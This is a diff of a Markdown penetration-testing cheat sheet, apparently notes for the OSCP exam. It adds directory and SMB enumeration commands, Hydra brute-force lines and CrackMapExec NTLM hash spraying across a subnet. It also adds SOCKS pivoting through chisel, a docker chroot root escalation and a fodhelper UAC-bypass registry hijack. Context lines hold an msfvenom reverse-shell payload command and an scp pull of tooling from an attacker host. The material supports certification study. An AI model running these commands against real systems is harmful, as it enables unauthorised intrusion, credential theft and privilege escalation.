@@ -31,26 +31,51 @@ nmapAutomator.sh -H $ip -t all
 
 ### Directory enumeration
 
+Recursive search, PHP extension
 ```bash
 dirsearch -u http://192.168.113.58 -x 403,400,404 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -R 2 -e php
+```
+Search from subdirectory, use specific user agent (uses default wordlist)
+```bash
+dirsearch -u http://10.11.1.2/books -R 3 -x 403,301,302 --header "User-Agent: Googlebot-Image"
+```
+
+Directory search with authentication
+```bash
+dirsearch -u http://192.168.225.46:242 -x 403,400,404,401 -r -R 2 --auth=offsec:elite --auth-type=basic
+```
+
+Plenty of other tools we can use such as `gobuster`:
+
+```bash
+gobuster dir -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.11.1.115/webmail/src -x php -t 12
 ```
 
 ## SMB
 
+Nmap SMB NSE scripts
 ```bash
 nmap -p139,445 --script smb-vuln-* $IP
 nmap -p139,445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP
-
+```
+SMBMap
+```bash
 smbmap -H $IP
 smbmap -H $IP -u anonymous
 smbmap [-L] [-r] -H $IP -u $username -p $password -d $workgroup
 smbmap -H $IP -R --depth 5
+```
 
+SMBClient
+```bash
 smbclient -L $IP
 smbclient //$IP/tmp
 smbclient \\\\$IP\\ipc$ -U $username 
 smbclient //$IP/ipc$ -U $username
+```
 
+We can mount a network share for easier enumeration.
+```bash
 mount -t cifs //$IP/$shared_folder $mount_folder
 ```
 
@@ -123,14 +148,24 @@ If firewall rules blocks HTTP connections and we have a low-privilege shell, we 
 scp -i /var/lib/postgresql/.ssh/id_rsa kali@192.168.49.171:/home/kali/tools/linpeas.sh /tmp/
 ```
 
-# Tools
+# Brute Forcing
 ## Hydra
 
 HTTP-Post-Form
 ```bash
-sudo hydra -l dj -P /usr/share/wordlists/rockyou.txt 10.11.1.128 -s 4167 http-post-form "/loginform.asp:uname=^USER^&psw=^PASS^:Internal server error."
+hydra -l dj -P /usr/share/wordlists/rockyou.txt 10.11.1.128 -s 4167 http-post-form "/loginform.asp:uname=^USER^&psw=^PASS^:Internal server error."
+```
+Bruteforce FTP with variable usernames and passwords
+```bash
+hydra -L users.txt -P /opt/SecLists/Discovery/Web-Content/raft-small-words.txt 192.168.225.46 ftp -V -f
 ```
 
+## Cewl
+
+Custom wordlists from webpages etc.
+```bash
+cewl -w cewl_passlist.txt -d 5 10.11.1.39/otrs/index.pl
+```
 
 # Credential Dumping
 ## Mimikatz
@@ -229,6 +264,11 @@ Spraying usernames
 crackmapexec smb 10.11.1.1 -u users.txt -p ThisIsTheUsersPassword01 --continue-on-success
 ```
 
+Spraying user NTLM hash around subnet to test access (SMB authentication). We can also use `winrm` or `mssql`.
+```bash
+crackmapexec smb 10.11.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:f4ada15ad8818bf28966bf80ec3e2d9d' --local-auth --continue-on-success
+```
+
 # Pivoting 
 ## Port forwarding
 SSH
@@ -277,7 +317,35 @@ chisel.exe client 10.10.14.3:8000 R:socks
 chisel.exe client 10.10.14.3:8000 R:5000:socks
 ```
 
-# Internal Reconnaissance
+Once we have a SOCKS proxy set up we can channel our commands through it either via `proxychains4` or through proxy options on specific tools.
+
+```bash
+dirsearch -u http://10.1.1.20/ -R 2 -x 400,403 --proxy socks5://localhost:9050
+```
+
+# Privilege Escalation
+
+## Internal Reconnaissance - Linux
+
+### SUID
+
+```bash
+find / -type f -perm -u=s 2>/dev/null
+```
+
+### Groups
+Check for any interesting group membership
+
+```bash
+bob@example:/$ groups
+bob adm cdrom dip plugdev lpadmin sambashare docker
+```
+Docker privilege escalation
+```bash
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
+## Internal Reconnaissance - Windows
 
 Check for unquoted service paths
 ```powershell
@@ -298,15 +366,20 @@ Check for plaintext passwords
 reg query HKLM /f pass /t REG_SZ /s
 ```
 
-## UAC Bypass
+### UAC Bypasses
 
-Fodhelper and Eventvwr (check SVcorp notes) 
+If we land on a shell for an Administrator-group user (perhaps unlikely, but possible in the AD section of the exam), and upon checking `whoami /groups`, we see `MEDIUM INTEGRITY` or something similar, a User Account Control Bypass is required.
+
+This is a fantastic resource for UAC - [Bypassing default UAC settings manually](https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/)
+
+There are few methods available here, but the essence of the UAC bypass is that some Windows binaries are set to auto-elevate to High Integrity without a UAC prompt; this can be exploited to hijack the execution flow and spawn a reverse shell for example. `Fodhelper.exe` and `eventvwr.exe` are often referenced as examples of this.
 
 ```powershell
-where /r C:\Windows fodhelper.exe
+PS C:\Users\bob\Documents> .\strings64.exe -accepteula C:\Windows\System32\eventvwr.exe | findstr /i autoelevate
+        <autoElevate>true</autoElevate>
 ```
 
-Exploit `fodhelper.exe` UAC bypass.
+Example exploit for `fodhelper.exe` UAC bypass.
 ```powershell
 $c = "C:\Windows\System32\cmd.exe"
 New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
@@ -378,16 +451,6 @@ Generate shellcode with MSFvenom:
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.136 LPORT=80 -f c -b "\x00\x04\x05\x18\x19\x91\x92\xa5\xa6\xf5\xf6" 
 ```
 
-
-Compile Windows exploit on Kali
-```bash
-# 64-bit
-x86_64-w64-mingw32-gcc shell.c -o shell.exe
-
-# 32-bit
-i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
-```
-
 # Miscellaneous
 Path not set 
 
@@ -398,4 +461,13 @@ set PATH=%SystemRoot%\system32;%SystemRoot%;
 Linux
 ```bash
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+
+Compile Windows exploit on Kali
+```bash
+# 64-bit
+x86_64-w64-mingw32-gcc shell.c -o shell.exe
+
+# 32-bit
+i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
 ```
